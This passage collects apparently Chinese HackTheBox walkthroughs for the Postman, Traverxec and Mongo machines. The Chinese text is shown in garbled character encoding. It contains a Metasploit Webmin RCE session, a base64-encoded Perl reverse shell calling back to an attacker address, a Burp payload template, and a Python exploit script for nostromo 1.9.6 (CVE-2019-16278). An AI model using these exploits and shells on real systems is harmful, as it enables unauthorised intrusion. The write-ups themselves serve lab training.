<p>ç”¨ssh2john.pyè½¬æ¢ä¸ºJohnå¯è¯†åˆ«çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
<p>å†ç”¨Johnæ¥ç ´è§£RSAå¯†ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (id_rsa)</span><br><span class="line">1g 0:00:00:35 DONE (2020-02-10 04:28) 0.02844g/s 408014p/s 408014c/s 408014C/sa6_123..*7Â¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>åˆ‡æ¢ä¸ºMattç”¨æˆ·ï¼Œè¯»å–user.txtæ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ su Matt</span><br><span class="line">Password: </span><br><span class="line">Matt@Postman:/var/lib/redis$ <span class="built_in">cd</span> /home/Matt/</span><br><span class="line">Matt@Postman:~$ cat user.txt </span><br><span class="line">517ad0ec2458ca97af8d93aac08a2f3c</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™é‡Œä¸èƒ½ç”¨id_rsaç§é’¥æ–‡ä»¶æ¥ç™»å½•é¶æœºï¼Œæ¯æ¬¡ç™»å½•æˆåŠŸåéƒ½ä¼šå‡ºç°Connection close</p>
</blockquote>
<p>ç”¨lse.shè„šæœ¬æŸ¥çœ‹rootæƒé™è¿è¡Œçš„è¿›ç¨‹ï¼Œå‘ç°åˆåœ¨10000ç«¯å£ä¸Šçš„webminï¼Œç”¨<code>Matt</code>å’Œ<code>computer2008</code>å¯ä»¥æˆåŠŸç™»å½•ï¼ŒGoogle<code>webmin exploit</code>ï¼Œexploit-dbä¸Šæœ‰å¦‚ä¸‹åˆ©ç”¨æ–¹å¼ï¼š</p>
<p><a href="https://www.exploit-db.com/exploits/46984">https://www.exploit-db.com/exploits/46984</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210215936.png" alt=""></p>
<p>metasploitä¹Ÿæ”¶å½•è¿™ä¸ªæ¼æ´ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   computer2008     yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME   Matt             yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit                         </span><br><span class="line">                                                                                </span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.113:4444                            </span><br><span class="line">[+] Session cookie: ba61f4eadcffcce039b166a29defa004                            </span><br><span class="line">[*] Attempting to execute the payload...                                        </span><br><span class="line">[*] Command shell session 1 opened (10.10.14.113:4444 -&gt; 10.10.10.160:46990) at </span><br><span class="line">2019-12-24 17:43:52 -0500                                                       </span><br><span class="line">cat /root/root.txt                                                              </span><br><span class="line">                                                                                </span><br><span class="line">a257741[-----------------]ddce</span><br></pre></td></tr></table></figure>
<p>å¤§æ¦‚çœ‹äº†ä¸€ä¸‹Payloadçš„åˆ©ç”¨ï¼Œåº”è¯¥æ˜¯Webminåœ¨ç®¡ç†å‡çº§è½¯ä»¶çš„æ—¶å€™é€ æˆäº†å‘½ä»¤æ³¨å…¥ï¼Œæ‰§è¡Œäº†é¢å¤–çš„ç”¨æˆ·å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨Burp Suiteå‘é€Payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;package-updates&#x2F;update.cgi HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Host: [RHOST]:[RPORT]</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line"></span><br><span class="line">Cookie: sid&#x3D;[INPUT GOOD SID HERE]</span><br><span class="line"></span><br><span class="line">Referer: [RHOST]:[RPORT]&#x2F;package-updates&#x2F;?xnavigation&#x3D;1</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 432</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">u&#x3D;acl%2Fapt&amp;u&#x3D;[PAYLOAD HERE]</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line">                POC Payload Info</span><br><span class="line">URL decoded</span><br><span class="line">  | bash -c &quot;&#123;echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4yMjI6NDQ0NCIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTsn&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"></span><br><span class="line">base64 decoded</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;</span><br><span class="line"></span><br><span class="line">all together decoded</span><br><span class="line">  | bash -c &quot;&#123;echo,perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>â€œPostmanâ€æ˜¯åŸºäºLinuxçš„é¶æœºï¼Œé¦–å…ˆåˆ©ç”¨RedisæœåŠ¡å™¨ï¼Œä½¿æ”»å‡»è€…å¯ä»¥ç”Ÿæˆè‡ªå·±çš„SSHå…¬å…±å¯†é’¥æ–‡ä»¶å¹¶å°†å…¶å†™å…¥æœåŠ¡å™¨ï¼Œä»¥è·å–å¯¹ç³»ç»Ÿçš„æœªæˆæƒè®¿é—®å¹¶å‘ç°ç”¨æˆ·ï¼ˆMattï¼‰çš„å·²åŠ å¯†çš„sshå¯†é’¥ã€‚ æˆ‘ä»¬å°†è·å–åˆ°çš„åŠ å¯†çš„sshå¯†é’¥ä½¿ç”¨JohnTheRipperå¯¹å…¶è¿›è¡Œç ´è§£ä»¥è·å¾—sshçš„å¯†ç ã€‚ ä¹‹åï¼Œå†åˆ©ç”¨10000ç«¯å£ä¸Šçš„Webmin Portalï¼Œä»¥Mattçš„èº«ä»½ç™»å½•å¹¶è®¿é—®Webminé¢æ¿ã€‚ æœ€åï¼Œæˆ‘ä»¬åœ¨Webminé¢æ¿ä¸­æœç´¢äº†å…³äºç‰ˆæœ¬å·çš„æ¼æ´åˆ©ç”¨ï¼Œå¹¶é€šè¿‡metasploitæˆåŠŸåœ°åˆ©ç”¨äº†è¯¥æ¼æ´å¹¶è·å¾—äº†rootã€‚</p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p>[<a href="https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin%201.910%20-%20Remote%20Code%20Execution%20using%20BurpSuite">https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin 1.910 - Remote Code Execution using BurpSuite</a>](<a href="https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin">https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin</a> 1.910 - Remote Code Execution using BurpSuite)</p>
<p><a href="https://blog.csdn.net/test1988x/article/details/103921210">https://blog.csdn.net/test1988x/article/details/103921210</a></p>
<p><a href="https://www.soeren.codes/2019/12/24/postbox-writeup/">https://www.soeren.codes/2019/12/24/postbox-writeup/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Traverxec Walkthrough</title>
    <url>/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Traverxec-Walkthrough">HTB::Traverxec Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200212095015.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>searchexploit</li>
<li>nostromo 1.9.6</li>
<li><a href="http://LinEnum.sh">LinEnum.sh</a></li>
<li>JohnTheRipper</li>
<li>GTFObins</li>
</ul>
<h2 id="0x03-Penetration-Test">0x03 Penetration Test</h2>
<p>nmapæ‰«æç«¯å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.165</span><br><span class="line">Host is up (0.083s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 aa:99:a8:16:68:<span class="built_in">cd</span>:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)</span><br><span class="line">| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)</span><br><span class="line">|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)</span><br><span class="line">80/tcp open http nostromo 1.9.6</span><br><span class="line">|_http-server-header: nostromo 1.9.6</span><br><span class="line">|_http-title: TRAVERXEC</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Service detection performed. Please report any incorrect results at</span><br><span class="line">https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>
<p>æµè§ˆå™¨æ‰“å¼€10.10.10.165ï¼Œæœ‰ä¸€ä¸ªå‘é‚®ä»¶çš„åŠŸèƒ½ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214113934.png" alt=""></p>
<p>å¤šæ¬¡æµ‹è¯•å‘ç°æ²¡ä»€ä¹ˆç”¨ï¼Œæ„Ÿè§‰è¿™ä¸ªç½‘ç«™æ˜¯ä¸ªåŠæˆå“ã€‚ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°ä»–ç”¨çš„ä¸­é—´ä»¶æ˜¯<code>nostromo 1.9.6</code>ï¼ŒæŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„exploit</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214143623.png" alt=""></p>
<p>åˆšå¥½æœ‰ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´å¯ä»¥åˆ©ç”¨ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214144332.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214145829.png" alt=""></p>
<p>ç›´æ¥åˆ©ç”¨è·å–shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214151354.png" alt=""></p>
<p>å†è¿”å›ä¸€ä¸ªäº¤äº’å¼shellï¼Œ<code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p>
<p>åœ¨æœ¬æœºä¸Šå¯åŠ¨ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå°†ææƒè„šæœ¬ä¼ åˆ°é¶æœºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214153726.png" alt=""></p>
<p>ç»™æ‰§è¡Œæƒé™ï¼š<code>chmod +x LinEnum.sh</code>ï¼Œæ‰§è¡Œè„šæœ¬<code>./LinEnum.sh</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214154125.png" alt=""></p>
<p>å‘ç°æœ‰ä¸€ä¸ªdavidç”¨æˆ·ï¼Œè¿˜æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214154413.png" alt=""></p>
<p>ç”¨JohnTheRipperå°è¯•è§£å¯†ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214155024.png" alt=""></p>
<p>å°è¯•ç”¨<code>Nowonly4me</code>è¿æ¥sshä»¥åŠsuå¯†ç å‘ç°éƒ½ä¸æ­£ç¡®ã€‚å¹¶ä¸”ä¸èƒ½ç›´æ¥<code>cd</code>è¿›å…¥<code>/home/david</code>ç›®å½•ã€‚Googleäº†ä¸€ä¸‹æ€è·¯ï¼Œç½‘ä¸Šè¯´ä»”ç»†çœ‹çœ‹é…ç½®æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214155650.png" alt=""></p>
<p>åœ¨<code>HOMEDIRS</code>ä¸­é…ç½®ä¸€ä¸ª<code>homedirs_public</code>è·¯å¾„ï¼Œè¯•ä¸€ä¸‹çœ‹èƒ½ä¸èƒ½è¿›å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214160113.png" alt=""></p>
<p>å‘ç°äº†ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåœ¨<code>/tmp</code>ç›®å½•ä¸‹è§£å‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214160819.png" alt=""></p>
<p>æŠŠè¿™ä¸ªå¯†é’¥copyåˆ°ä¸»æœºç”¨JohnTheRipperçˆ†ç ´ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214161152.png" alt=""></p>
<p>çˆ†ç ´å‡ºå¯†é’¥çš„è®¤è¯å¯†ç <code>hunter</code>ï¼Œç”¨SSHè¿æ¥ï¼Œå¾—åˆ°user.txtï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@traverxec:~$ <span class="built_in">cd</span> /home/david/</span><br><span class="line">david@traverxec:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwx--x--x 5 david david 4096 Oct 25 17:02 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Oct 25 14:32 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Oct 25 16:15 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 david david  220 Oct 25 14:32 .bash_logout</span><br><span class="line">-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrc</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 16:26 bin</span><br><span class="line">-rw-r--r-- 1 david david  807 Oct 25 14:32 .profile</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25 15:45 public_www</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 17:02 .ssh</span><br><span class="line">-r--r----- 1 root  david   33 Oct 25 16:14 user.txt</span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7db0b[--------------------]d9782f3d</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™ä¸ªç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª<code>bin</code>æ–‡ä»¶å¤¹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214161845.png" alt=""></p>
<p>æˆ‘ä»¬åŸºæœ¬ä¸Šçœ‹åˆ°å®ƒåªæ˜¯è¾“å‡ºä¸€ä¸ªHEADï¼ˆbinç›®å½•ä¸­çš„å¦ä¸€ä¸ªæ–‡ä»¶ï¼‰å’Œæœ‰å…³æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯ã€‚ è¯¥è„šæœ¬çš„æœ€åä¸€è¡Œæ˜¯æœ€é‡è¦çš„ï¼Œå®ƒå…ˆè¿è¡Œsudoï¼Œç„¶åè¿è¡Œjournalctlï¼Œä¹Ÿå°±æ˜¯è¯´journalctlæ­£åœ¨ä»¥rootçš„ç‰¹æƒè¿è¡Œï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶journalctlä¹Ÿå°±æ‹¥æœ‰rootç‰¹æƒã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•æ›´æ”¹ä»»ä½•å‚æ•°ã€‚ è¿è¡Œé™¤<code>sudo journalctl -n5 -unostromo.service</code>ä»¥å¤–çš„ä»»ä½•å†…å®¹æ—¶ï¼Œå°†è¦æ±‚æä¾›å¯†ç ã€‚</p>
<p>æ²¡ä»€ä¹ˆæ€è·¯ï¼Œåªèƒ½å†ä¸€æ¬¡æ±‚åŠ©Googleï¼Œæç¤ºæˆ‘ä»¬ç”¨GTFObinsï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214162501.png" alt=""></p>
<p>è¿è¡Œ<code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code>æ—¶ï¼ŒæŠŠçª—å£ç¼©å°ä¸€ç‚¹ï¼Œå†è¾“å…¥<code>!/bin/sh</code>ï¼ŒæˆåŠŸè·å¾—rootæƒé™ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214181407.png" alt=""></p>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Traverxecæ˜¯ä¸€ä¸ªåŸºäºLinuxçš„é¶æœºï¼Œå¼€æ”¾äº†æ™®é€šçš„22å’Œ80ç«¯å£ï¼Œ80ç«¯å£ä¸Šè¿è¡Œçš„ç½‘ç«™æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯ç½‘ç«™çš„ä¸­é—´ä»¶æœåŠ¡nostromo 1.9.6æœ‰ä¸€ä¸ªç›®å½•ç©¿è¶Šç»•è¿‡è¿›è€Œé€ æˆä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œä»¥<code>www-data</code>æƒé™è¿›å…¥é¶æœºåï¼Œå‘ç°<code>/home/david</code>ç›®å½•ä¸å¯è¾¾ã€‚ä½†æ˜¯æŸ¥çœ‹nostromoæ–‡æ¡£å‘ç°ï¼Œé…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªHOMEDIRSçš„é€‰é¡¹ï¼Œå…¶ä¸­<code>homedirs_public</code>å±æ€§æŒ‡å®šäº†ç½‘ç«™çš„ä¸»ç›®å½•ï¼Œå‘ç°<code>/home/david/pulic_www/</code>æ˜¯å¯è¾¾çš„ï¼Œé‡Œé¢æœ‰davidçš„ç§é’¥ã€‚ææƒçš„è¿‡ç¨‹æŸ¥äº†ä¸€ä¸‹Googleï¼Œå‘ç°<code>/home/david/bin</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ªè„šæœ¬ï¼Œè€Œä¸”<code>/usr/bin/journalctl</code>æ˜¯ä½œä¸º root è¿è¡Œçš„ï¼ŒæŸ¥çœ‹ <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFObins</a>ï¼Œå‘ç°é€šè¿‡ sudo è¿è¡Œçš„ journalctl å¯ä»¥è¢«åˆ©ç”¨æ¥ææƒï¼Œç¼©å°çª—å£è¿›è€Œè§¦å‘<code>pager</code>ï¼Œè·å¾—rootæƒé™ã€‚</p>
<h2 id="0x05-nostromo-1-9-6-exploit">0x05 nostromo 1.9.6 exploit</h2>
<p>æºç åˆ†æä¸€ä¸‹nostromo 1.9.6çš„ç›®å½•ç©¿è¶Šæ¼æ´ã€‚å…ˆè´´ä¸Šåˆ©ç”¨ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">help_menu = <span class="string">&#x27;\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">soc</span>):</span></span><br><span class="line">    response = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            connection = soc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(connection) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response += connection</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve</span>(<span class="params">target, port, cmd</span>):</span></span><br><span class="line">    soc = socket.socket()</span><br><span class="line">    soc.connect((target, int(port)))</span><br><span class="line">    payload = <span class="string">&#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&#x27;</span>.format(cmd)</span><br><span class="line">    soc.send(payload)</span><br><span class="line">    receive = connect(soc)</span><br><span class="line">    print(receive)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    print(art)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">        cve(target, port, cmd)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        print(help_menu)</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆï¼ŒæœåŠ¡å™¨ä¼šéªŒè¯è¯·æ±‚ç„¶åå¤„ç†å®ƒã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214194559.png" alt=""></p>
<p>åœ¨ä¸Šå›¾çš„å‡½æ•°<code>http_verify()</code>ä¸­ï¼Œè¯·æ±‚çš„é¦–è¡Œä¼šå…ˆè¿›è¡Œè§£ç ï¼Œç„¶åæ£€æŸ¥<code>/../</code>æ˜¯å¦å­˜åœ¨ã€‚æ³¨æ„ï¼Œæ­¤æ—¶æ”»å‡»è¯·æ±‚çš„é¦–è¡ŒåŒ…å«<code>/.\r./.\r./.\r./.\r./bin/sh</code>ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195010.png" alt=""></p>
<p>æ¥ä¸‹æ¥ï¼Œå‡½æ•°<code>http_proc()</code>ä¼šå°†é¦–è¡Œä¼ é€’ç»™å‡½æ•°<code>http_header()</code>ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195442.png" alt=""></p>
<p>æ¼æ´æ ¹æºå°±åœ¨è¿™ï¼Œå‡½æ•°<code>http_header()</code>ä¼šé€šè¿‡å‡½æ•°<code>strcutl()</code>è§£ææ•°æ®ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195520.png" alt=""></p>
<p>è€Œåœ¨å‡½æ•°<code>strcutl()</code>çš„å†…éƒ¨ï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒä¼šæŠŠå­—ç¬¦ä¸²ä¸­çš„\rï¼ˆå›è½¦ï¼‰å»é™¤ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195727.png" alt=""></p>
<p>æœ€åï¼Œå¾—åˆ°çš„è·¯å¾„æ˜¯<code>/../../../../bin/sh</code>ã€‚é‚£ä¹ˆï¼Œç›®å½•ç©¿è¶Šå®Œæˆï¼Œå‘½ä»¤æ‰§è¡Œå¦‚ä½•è¿›è¡Œå‘¢ï¼Ÿåœ¨å‡½æ•°<code>http_proc()</code>ä¸­çš„<code>execve()</code>å‡½æ•°ï¼ˆç”¨äºæ‰§è¡ŒæŒ‡å®šç¨‹åºï¼‰ä¸­ï¼Œå®ƒæ‰§è¡Œäº†<code>rh-&gt;rq_filef</code>ï¼Œè¿™æ­£æ˜¯è·¯å¾„è¿‡æ»¤åçš„ç»“æœ<code>/../../../../bin/sh</code>ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195939.png" alt=""></p>
<p>äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªå¯å¯¼è‡´RCEçš„ç›®å½•ç©¿è¶Šã€‚</p>
<blockquote>
<p>ä¸å¾—ä¸è¯´å‘ç°è¿™ä¸ªæ¼æ´çš„å¸ˆå‚…ä»£ç å®¡è®¡èƒ½åŠ›çœŸå¼ºï¼Œæˆ‘ä»¬éƒ½æ˜¯å¼Ÿå¼Ÿã€‚</p>
</blockquote>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://blog.csdn.net/JBlock/article/details/88619117">https://blog.csdn.net/JBlock/article/details/88619117</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Mongo Walkthrough</title>
    <url>/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Mongo-Walkthrough">HTB::Mongo Walkthrough</h1>
<h2 id="0x01-Information">0x01 Information</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200310124657.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>Nmap</li>
<li><code>LinEnum.sh</code></li>
<li>gtfobins</li>
<li>MongoDBæ³¨å…¥</li>
</ul>
